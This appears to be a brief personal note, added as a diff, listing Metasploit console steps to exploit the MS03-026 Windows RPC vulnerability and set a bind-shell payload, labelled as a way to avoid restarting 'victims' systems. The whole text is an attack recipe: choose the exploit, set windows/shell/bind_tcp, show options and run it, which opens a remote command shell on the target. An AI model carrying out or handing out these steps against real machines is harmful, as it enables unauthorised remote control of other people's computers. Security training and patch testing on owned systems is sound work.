@@ -1,0 +1,9 @@
+*for not restarting victims systems*
+ms03-026
+use it
+set payload 		..2 times tab after space
+
+q
+set payload windows/shell/bind_tcp
+show options 
+exploit
